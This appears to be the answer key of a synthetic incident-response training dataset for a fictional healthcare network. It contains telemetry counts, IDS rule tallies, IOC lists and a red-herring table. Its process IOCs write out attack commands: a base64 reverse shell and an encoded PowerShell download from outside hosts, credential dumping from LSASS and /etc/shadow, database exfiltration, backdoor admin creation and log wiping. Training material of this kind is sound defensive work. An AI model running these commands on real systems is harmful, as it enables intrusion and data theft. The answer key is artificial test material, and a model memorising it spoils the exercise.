| evt-002 | zeek | delayed: 532, dropped: 1, filtered: 2, visible: 180 |
| evt-003 | syslog | delayed: 3 |
| evt-003 | zeek | delayed: 2 |
| evt-004 | asa | delayed: 2 |
| evt-004 | ecar | delayed: 2 |
| evt-004 | web | delayed: 2 |
| evt-004 | zeek | delayed: 2, visible: 2 |
| evt-005 | asa | delayed: 2 |
| evt-005 | ecar | delayed: 4 |
| evt-005 | syslog | visible: 1 |
| evt-005 | web | delayed: 1 |
| evt-005 | zeek | delayed: 3 |
| evt-006 | asa | delayed: 31 |
| evt-006 | bash_history | visible: 6 |
| evt-006 | ecar | delayed: 63 |
| evt-006 | syslog | delayed: 8 |
| evt-006 | sysmon | delayed: 17 |
| evt-006 | windows_security | delayed: 6 |
| evt-006 | zeek | delayed: 21, visible: 10 |
| evt-007 | bash_history | visible: 3 |
| evt-007 | ecar | delayed: 6 |
| evt-008 | asa | delayed: 3, filtered: 1 |
| evt-008 | ecar | delayed: 7 |
| evt-008 | ids | delayed: 2 |
| evt-008 | syslog | delayed: 4 |
| evt-008 | windows_security | delayed: 2 |
| evt-008 | zeek | delayed: 3, visible: 3 |
| evt-009 | bash_history | visible: 2 |
| evt-009 | ecar | delayed: 4 |
| evt-010 | ecar | delayed: 8 |
| evt-010 | sysmon | delayed: 8 |
| evt-010 | windows_security | delayed: 2 |
| evt-011 | ecar | delayed: 1 |
| evt-011 | syslog | delayed: 1 |
| evt-011 | windows_security | delayed: 1 |
| evt-012 | asa | delayed: 2, filtered: 5 |
| evt-012 | ecar | delayed: 12 |
| evt-012 | sysmon | delayed: 2 |
| evt-012 | windows_security | delayed: 18 |
| evt-012 | zeek | delayed: 6, visible: 2 |
| evt-013 | asa | delayed: 2, filtered: 1 |
| evt-013 | ecar | delayed: 41 |
| evt-013 | sysmon | delayed: 38 |
| evt-013 | windows_security | delayed: 14 |
| evt-013 | zeek | delayed: 2, visible: 2 |
| evt-014 | ecar | delayed: 13 |
| evt-014 | sysmon | delayed: 13 |
| evt-014 | windows_security | delayed: 2 |
| evt-015 | asa | delayed: 3 |
| evt-015 | ecar | delayed: 23 |
| evt-015 | sysmon | delayed: 21 |
| evt-015 | windows_security | delayed: 11 |
| evt-015 | zeek | delayed: 1, visible: 3 |
| evt-016 | ecar | delayed: 34 |
| evt-016 | sysmon | delayed: 34 |
| evt-016 | windows_security | delayed: 10 |
| evt-017 | asa | filtered: 2 |
| evt-017 | ecar | delayed: 34 |
| evt-017 | sysmon | delayed: 33 |
| evt-017 | windows_security | delayed: 11 |
| evt-017 | zeek | delayed: 1, visible: 2 |
| evt-018 | asa | delayed: 26 |
| evt-018 | ecar | delayed: 33, dropped: 1 |
| evt-018 | proxy | delayed: 10 |
| evt-018 | sysmon | delayed: 18 |
| evt-018 | windows_security | delayed: 18 |
| evt-018 | zeek | delayed: 46, visible: 16 |
| evt-019 | asa | delayed: 3, out_of_window: 1 |
| evt-019 | ecar | delayed: 3, out_of_window: 1 |
| evt-019 | proxy | delayed: 3, out_of_window: 1 |
| evt-019 | sysmon | delayed: 3, out_of_window: 1 |
| evt-019 | zeek | delayed: 4, out_of_window: 2, visible: 2 |
| evt-020 | asa | delayed: 20, filtered: 309 |
| evt-020 | ecar | delayed: 327, dropped: 2 |
| evt-020 | ids | delayed: 6, dropped: 4, filtered: 283 |
| evt-020 | sysmon | delayed: 20 |
| evt-020 | windows_security | delayed: 342, visible: 4 |
| evt-020 | zeek | delayed: 483, dropped: 2, filtered: 6, visible: 167 |
| evt-021 | asa | delayed: 90, dropped: 1 |
| evt-021 | ecar | delayed: 91 |
| evt-021 | ids | delayed: 18, dropped: 1, filtered: 162 |
| evt-021 | windows_security | delayed: 90, visible: 1 |
| evt-021 | zeek | delayed: 144, visible: 38 |
| evt-022 | asa | delayed: 2 |
| evt-022 | ecar | delayed: 27 |
| evt-022 | sysmon | delayed: 26 |
| evt-022 | windows_security | delayed: 12 |
| evt-022 | zeek | delayed: 2 |
| evt-023 | asa | filtered: 5 |
| evt-023 | bash_history | visible: 12 |
| evt-023 | ecar | delayed: 39 |
| evt-023 | syslog | delayed: 10 |
| evt-023 | windows_security | delayed: 3 |
| evt-023 | zeek | delayed: 6, visible: 2 |
| evt-024 | windows_security | delayed: 1 |
| evt-025 | asa | delayed: 6 |
| evt-025 | ecar | delayed: 36 |
| evt-025 | proxy | delayed: 1 |
| evt-025 | sysmon | delayed: 29 |
| evt-025 | windows_security | delayed: 8, visible: 2 |
| evt-025 | zeek | delayed: 16 |
| evt-026 | asa | delayed: 5, filtered: 3, visible: 1 |
| evt-026 | ecar | delayed: 10 |
| evt-026 | proxy | delayed: 3 |
| evt-026 | windows_security | delayed: 2 |
| evt-026 | zeek | delayed: 16, visible: 8 |
| evt-027 | ecar | delayed: 1 |
| evt-027 | windows_security | delayed: 2 |
| evt-028 | bash_history | visible: 1 |
| evt-028 | ecar | delayed: 2 |
| evt-029 | bash_history | visible: 1 |
| evt-029 | ecar | delayed: 3 |
| evt-030 | asa | delayed: 2 |
| evt-030 | ecar | delayed: 28 |
| evt-030 | proxy | delayed: 1 |
| evt-030 | sysmon | delayed: 27 |
| evt-030 | windows_security | delayed: 7 |
| evt-030 | zeek | delayed: 6 |
| evt-031 | asa | filtered: 3 |
| evt-031 | ecar | delayed: 3 |
| evt-031 | windows_security | delayed: 3 |
| evt-031 | zeek | delayed: 6 |
| evt-032 | ecar | delayed: 17 |
| evt-032 | sysmon | delayed: 17 |
| evt-032 | windows_security | delayed: 4 |
| evt-033 | ecar | delayed: 9 |
| evt-033 | sysmon | delayed: 8 |
| evt-033 | windows_security | delayed: 9 |
| evt-034 | ecar | delayed: 2 |
| evt-034 | sysmon | delayed: 1 |
| evt-034 | windows_security | delayed: 2 |
| evt-035 | ecar | delayed: 2 |
| evt-035 | syslog | delayed: 2 |
| evt-email-001 | asa | delayed: 7, filtered: 2 |
| evt-email-001 | ecar | delayed: 13 |
| evt-email-001 | proxy | delayed: 2 |
| evt-email-001 | syslog | delayed: 10 |
| evt-email-001 | sysmon | delayed: 5 |
| evt-email-001 | windows_security | delayed: 6 |
| evt-email-001 | zeek | delayed: 13, visible: 7 |
| evt-email-002 | asa | delayed: 2 |
| evt-email-002 | ecar | delayed: 2 |
| evt-email-002 | proxy | delayed: 1 |
| evt-email-002 | sysmon | delayed: 1 |
| evt-email-002 | zeek | delayed: 4 |
| evt-email-003 | all | out_of_window: 14 |
| evt-email-003 | asa | delayed: 5, filtered: 2 |
| evt-email-003 | ecar | delayed: 24 |
| evt-email-003 | syslog | delayed: 10, visible: 2 |
| evt-email-003 | sysmon | delayed: 23 |
| evt-email-003 | windows_security | delayed: 13 |
| evt-email-003 | zeek | delayed: 16, visible: 2 |
| evt-email-004 | asa | delayed: 11, filtered: 3 |
| evt-email-004 | ecar | delayed: 28 |
| evt-email-004 | syslog | delayed: 20 |
| evt-email-004 | sysmon | delayed: 12 |
| evt-email-004 | windows_security | delayed: 11 |
| evt-email-004 | zeek | delayed: 16, visible: 20 |
| evt-email-005 | asa | delayed: 2 |
| evt-email-005 | ecar | delayed: 2 |
| evt-email-005 | syslog | delayed: 2 |
| evt-email-005 | windows_security | delayed: 1 |
| evt-email-005 | zeek | delayed: 6 |
| evt-email-006 | asa | delayed: 4 |
| evt-email-006 | ecar | delayed: 7 |
| evt-email-006 | syslog | delayed: 8 |
| evt-email-006 | sysmon | delayed: 6 |
| evt-email-006 | windows_security | delayed: 5 |
| evt-email-006 | zeek | delayed: 9, visible: 2 |
| evt-email-007 | asa | delayed: 10, filtered: 2, visible: 1 |
| evt-email-007 | ecar | delayed: 20 |
| evt-email-007 | proxy | delayed: 1 |
| evt-email-007 | syslog | delayed: 9 |
| evt-email-007 | windows_security | delayed: 7 |
| evt-email-007 | zeek | delayed: 36 |
| evt-email-008 | asa | delayed: 7, filtered: 2 |
| evt-email-008 | ecar | delayed: 45 |
| evt-email-008 | proxy | delayed: 2 |
| evt-email-008 | syslog | delayed: 11 |
| evt-email-008 | sysmon | delayed: 41 |
| evt-email-008 | windows_security | delayed: 12 |
| evt-email-008 | zeek | delayed: 18, visible: 4 |
| evt-email-009 | asa | delayed: 1 |
| evt-email-009 | ecar | delayed: 1 |
| evt-email-009 | syslog | delayed: 2 |
| evt-email-009 | sysmon | delayed: 1 |
| evt-email-009 | windows_security | delayed: 1 |
| evt-email-009 | zeek | delayed: 2 |
| evt-email-010 | asa | delayed: 1 |
| evt-email-010 | ecar | delayed: 1 |
| evt-email-010 | syslog | delayed: 2 |
| evt-email-010 | zeek | delayed: 5 |
| evt-email-011 | asa | delayed: 8, filtered: 3 |
| evt-email-011 | ecar | delayed: 14 |
| evt-email-011 | proxy | delayed: 1 |
| evt-email-011 | syslog | delayed: 9 |
| evt-email-011 | sysmon | delayed: 9 |
| evt-email-011 | windows_security | delayed: 11, visible: 1 |
| evt-email-011 | zeek | delayed: 19, visible: 10 |
| f57bc27c-3613-42fd-adaf-11dc227c59a0 | ids | delayed: 1 |
| f7714795-da80-45b5-8c3e-0941d9545112 | ids | delayed: 1 |
| fae75ef9-d645-4600-a758-2b7817a1fa6d | ids | delayed: 1 |
| fd950cb6-b978-4451-8db7-3772bf3ad143 | ids | delayed: 1 |
| red_herring:rh-001 | ecar | delayed: 4 |
| red_herring:rh-001 | windows_security | delayed: 3, visible: 1 |
| red_herring:rh-002 | asa | delayed: 1 |
| red_herring:rh-002 | ecar | delayed: 34 |
| red_herring:rh-002 | sysmon | delayed: 33 |
| red_herring:rh-002 | windows_security | delayed: 7 |
| red_herring:rh-002 | zeek | delayed: 1 |
| red_herring:rh-003 | asa | delayed: 2 |
| red_herring:rh-003 | ecar | delayed: 5 |
| red_herring:rh-003 | ids | delayed: 1 |
| red_herring:rh-003 | proxy | delayed: 1 |
| red_herring:rh-003 | zeek | delayed: 4 |


## IDS Evaluation Summary

Observation totals: delayed=159, dropped=5, filtered=446, visible=2.

| Sensor | GID:SID | Candidates | Emitted | Policy Filtered | Origins | Digest |
|--------|---------|------------|---------|-----------------|---------|--------|
| snort-core | 1:2000334 | 2 | 2 | 0 | built_in=2 | `3de0a966caa9` |
| snort-core | 1:2000357 | 2 | 2 | 0 | built_in=2 | `f34caea9f4ff` |
| snort-core | 1:2000560 | 2 | 2 | 0 | built_in=2 | `d77e9e3d5abd` |
| snort-core | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `69b9892c22a4` |
| snort-core | 1:2016149 | 3 | 3 | 0 | built_in=3 | `b6bb00d8789e` |
| snort-core | 1:2024291 | 8 | 8 | 0 | built_in=8 | `9f458ee9a110` |
| snort-core | 1:2027757 | 9 | 9 | 0 | built_in=9 | `0200169ebb56` |
| snort-core | 1:2027863 | 5 | 5 | 0 | built_in=5 | `a3dca17a65e0` |
| snort-core | 1:2027865 | 94 | 13 | 81 | authored_attachment=9, built_in=4 | `f40d1f4c9afc` |
| snort-core | 1:2029706 | 293 | 10 | 283 | authored_attachment=6, built_in=4 | `b0c4b852712e` |
| snort-core | 1:366 | 1 | 1 | 0 | built_in=1 | `0521dcabff07` |
| snort-perimeter | 1:2000334 | 1 | 1 | 0 | built_in=1 | `7f1f60841ec8` |
| snort-perimeter | 1:2000357 | 1 | 1 | 0 | built_in=1 | `6fe46ddedeae` |
| snort-perimeter | 1:2000428 | 1 | 1 | 0 | built_in=1 | `ed28ccb7a65d` |
| snort-perimeter | 1:2000560 | 1 | 1 | 0 | built_in=1 | `170f0f9447ad` |
| snort-perimeter | 1:2000575 | 4 | 4 | 0 | built_in=4 | `7ed3b0e8a155` |
| snort-perimeter | 1:2002910 | 14 | 14 | 0 | built_in=14 | `a2c7fd09dc6e` |
| snort-perimeter | 1:2002911 | 1 | 1 | 0 | authored_attachment=1 | `5b133dc814b9` |
| snort-perimeter | 1:2003068 | 1 | 1 | 0 | built_in=1 | `dfccf472dcae` |
| snort-perimeter | 1:2010935 | 1 | 1 | 0 | built_in=1 | `313889cca6c2` |
| snort-perimeter | 1:2013028 | 2 | 2 | 0 | built_in=2 | `ef4fb7edf22d` |
| snort-perimeter | 1:2013504 | 2 | 2 | 0 | authored_attachment=1, built_in=1 | `1c19f10afd3c` |
| snort-perimeter | 1:2016149 | 3 | 3 | 0 | built_in=3 | `057ddaeed566` |
| snort-perimeter | 1:2016360 | 5 | 5 | 0 | built_in=5 | `bee7b36b11fb` |
| snort-perimeter | 1:2018959 | 4 | 4 | 0 | built_in=4 | `b0ab3a960748` |
| snort-perimeter | 1:2022476 | 3 | 3 | 0 | built_in=3 | `3e38a998dc39` |
| snort-perimeter | 1:2023672 | 9 | 9 | 0 | built_in=9 | `fd3e5acfdd3a` |
| snort-perimeter | 1:2023882 | 1 | 1 | 0 | built_in=1 | `4e72ebc6a5af` |
| snort-perimeter | 1:2024290 | 2 | 2 | 0 | built_in=2 | `e200fbec2d21` |
| snort-perimeter | 1:2024291 | 4 | 4 | 0 | built_in=4 | `3ad7ab719d64` |
| snort-perimeter | 1:2024897 | 2 | 2 | 0 | built_in=2 | `6554693685f1` |
| snort-perimeter | 1:2025712 | 2 | 2 | 0 | built_in=2 | `2995ccdd0224` |
| snort-perimeter | 1:2025991 | 5 | 5 | 0 | built_in=5 | `cbfee51e7671` |
| snort-perimeter | 1:2027316 | 2 | 2 | 0 | built_in=2 | `235e721af7cb` |
| snort-perimeter | 1:2027757 | 2 | 2 | 0 | built_in=2 | `7f6e21eef970` |
| snort-perimeter | 1:2027863 | 3 | 3 | 0 | built_in=3 | `bc39739c3608` |
| snort-perimeter | 1:2027865 | 92 | 11 | 81 | authored_attachment=9, built_in=2 | `d999f4dae7d8` |
| snort-perimeter | 1:2028401 | 2 | 2 | 0 | built_in=2 | `4973e6933586` |
| snort-perimeter | 1:2029706 | 2 | 2 | 0 | built_in=2 | `a5550c4fd054` |
| snort-perimeter | 1:366 | 5 | 5 | 0 | built_in=5 | `9f685facd23b` |
| snort-perimeter | 1:382 | 7 | 7 | 0 | built_in=7 | `a19ccf011f25` |
| snort-perimeter | 1:384 | 2 | 2 | 0 | built_in=2 | `41b2e68a7f6f` |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.1.35 (Attacker IP)
- 10.10.1.35:3389 (Lateral Movement)
- 10.10.1.99 (Attacker IP)
- 10.10.2.10:389 (Internal Server)
- 10.10.2.10:443 (Internal Server)
- 10.10.2.30:22 (Lateral Movement)
- 10.10.3.10:443 (Web Scan Target)
- 10.10.3.20:22 (Internal Server)
- 10.10.4.10:22 (Lateral Movement)
- 203.14.220.10:443 (C2 Server)
- 2j3rhpi2329sn.top (DGA Domain)
- 30rgw6r7503.top (DGA Domain)
- 45.33.32.30:443 (Beacon Target)
- 45.33.32.30:443 (Denied Beacon Target)
- 45.33.32.30:8443 (C2 Server)
- 6cja6syvo02mu.top (DGA Domain)
- DC-01.meridianhcs.local (Malicious DNS Query)
- Message-ID: <100000I9EMNA.1000OREDIL@meridianhcs.com>
- Message-ID: <1000016ONZTK.10015EDCND@meridianhcs.com>
- Message-ID: <121609FF-AFF2-1350-BCEC-8A52032BE7D0@meridianhcs.com>
- Message-ID: <1486572785.976919.3e76dbd7@meridianhcs.com>
- Message-ID: <1746897100.499514.89c6aefa@meridianhcs.com>
- Message-ID: <billing-a1f65b41-3807664@medclaims-processing.net>
- Message-ID: <notices-b9dac45a-8235363@benefits-serviceportal.com>
- Message-ID: <workspace-e2b1dcaf-9440641@docflow-health.net>
- Port 22 (scan target)
- Port 3306 (scan target)
- Port 443 (scan target)
- Port 80 (scan target)
- Port 8080 (scan target)
- Port 8443 (scan target)
- SMTP Zeek UID: C3GQ9JJdDuSnyD1fgx
- SMTP Zeek UID: C6aCByc1ERNzoLVey
- SMTP Zeek UID: C8oQRhg6K96GGxAag2
- SMTP Zeek UID: CBjMwShPYerLAFrF9ox
- SMTP Zeek UID: CCIrpUYCy5KCLOGbBx
- SMTP Zeek UID: CCkC4ZanHI2SZuV1f
- SMTP Zeek UID: CMsHichnRFdu5Yxzba
- SMTP Zeek UID: CNYd7niaSvG643FMp
- SMTP Zeek UID: CRLp48IEfI0xsHUfDfN
- SMTP Zeek UID: CUsWdkNBVcO1LIwgG9d
- SMTP Zeek UID: CVw0wptVfwYIGqE2qV
- SMTP Zeek UID: Ce8d1LJhaFT53ySJh
- SMTP Zeek UID: Cv6qrEX1vofj4G77z
- SMTP Zeek UID: CwAga4VoFw8QRV0fGy3
- SMTP Zeek UID: CyH3KndafE9Zaeg2Kvk
- Zeek UID: C7rdJJhTCrOnCKyaMI
- Zeek UID: CCH5ANa3I5MXMinx5m
- Zeek UID: CKGVr8GGSALPUbNlrN
- Zeek UID: CQx1TipjN7Au36XARBH
- Zeek UID: CX002u9GB4pthlOmxf
- Zeek UID: CfPd2QdS9cq1lYfazU
- Zeek UID: CgeWZfP2yCkgdFaZ20
- Zeek UID: CjT0VDQ6Eh9EyiFpjI
- Zeek UID: CrnrXN45nwMTsqSmkD
- Zeek UID: CyfmmGw0aWKU0SyLISJ
- api.westbridge-services.net (Malicious DNS Query)
- edge.westbridge-services.net (Malicious DNS Query)
- ewnjsaqf1rasgez5.top (DGA Domain)
- metrics.westbridge-services.net (Malicious DNS Query)
- ns1.westbridge-services.cloud (DNS Tunnel Endpoint)
- qrdqtp5nhn66chp00.top (DGA Domain)

### Process IOCs

- /bin/bash
- /usr/bin/cat
- /usr/bin/find
- /usr/bin/gzip
- /usr/bin/ls
- /usr/bin/mysqldump
- /usr/bin/nmap
- /usr/bin/scp
- /usr/bin/shred
- /usr/sbin/ip
- C:\Windows\System32\PSEXESVC.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\cmd.exe
- C:\Windows\System32\ms-index-service.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\DeviceSync
- Service: DeviceSyncSvc
- Service: PSEXESVC
- `PSEXESVC.exe -accepteula`
- `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'`
- `cat /etc/hosts`
- `cat /etc/passwd`
- `cat /etc/resolv.conf`
- `cat /etc/shadow`
- `cat /root/.ssh/id_rsa`
- `cat /var/www/html/config.php`
- `cmd.exe /c whoami && hostname`
- `find /opt/ehr -name '*credential*' -maxdepth 3`
- `gzip -9 /tmp/rpt_0318.sql`
- `history -c && cat /dev/null > ~/.bash_history`
- `ip addr show`
- `ls -la /root/.ssh`
- `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
- `mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql`
- `net group "Domain Admins" /domain`
- `net group "Domain Admins" svc_mhsync /add /domain`
- `net user /domain`
- `net user svc_mhsync /delete /domain`
- `net user svc_mhsync MhsSvc!2024 /add /domain`
- `net view /domain`
- `net view \\FILE-SRV-01`
- `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24`
- `nmap -sn 10.10.2.0/24`
- `powershell.exe -NoProfile -Command "Compress-Archive -Path \\FILE-SRV-01\Finance\Q1\*,\\FILE-SRV-01\Patients\Exports\* -DestinationPath C:\ProgramData\Microsoft\cache_7f3a.zip"`
- `powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA`
- `sc.exe create DeviceSyncSvc binPath= C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\DeviceSync" /SC HOURLY /TR "C:\Windows\System32\DeviceSyncSvc.exe" /RU SYSTEM`
- `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz`
- `shred -u /root/.bash_history`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Domain Admins (compromised account)
- SYSTEM (compromised account)
- aisha.johnson (compromised account)
- aisha.johnson (Spray Target) (compromised account)
- apache (compromised account)
- diego.ramirez (compromised account)
- diego.ramirez (Spray Target) (compromised account)
- evelyn.brooks (compromised account)
- lina.nguyen (compromised account)
- marcus.chen (compromised account)
- marcus.chen (Explicit Credential Target) (compromised account)
- omar.haddad (compromised account)
- priya.patel (compromised account)
- root (compromised account)
- sophia.martinez (Spray Target) (compromised account)
- svc_mhsync (compromised account)

### File IOCs

- %SystemRoot%\PSEXESVC.exe
- /root/.bash_history
- /tmp/rpt_0318.sql
- C:\Windows\System32\DeviceSyncSvc.exe
- artifacts/email/benefits-confirmation-msg.eml
- artifacts/email/docflow-ai-summary-msg.eml
- artifacts/email/ehr-release-note-msg.eml
- artifacts/email/executive-operating-note-msg.eml
- artifacts/email/finance-forward-to-it-msg.eml
- artifacts/email/internal-reset-lure-msg.eml
- artifacts/email/vendor-interface-package-msg.eml


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2024-03-18 13:04:41 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:43 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:46 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 13:04:48 UTC | sophia.martinez | WS-SMARTINEZ-01 | Sales user mistypes password several times before a normal logon | Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement. |
| 2024-03-18 14:05:18 UTC | lina.nguyen | WS-LNGUYEN-01 | Developer refreshes Ubuntu package metadata from the public archive | Routine package maintenance uses the APT HTTP user agent and triggers a low-priority policy alert. |
| 2024-03-18 17:10:23 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:25 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
| 2024-03-18 17:10:27 UTC | marcus.chen | DC-01 | Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01 | Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics. |
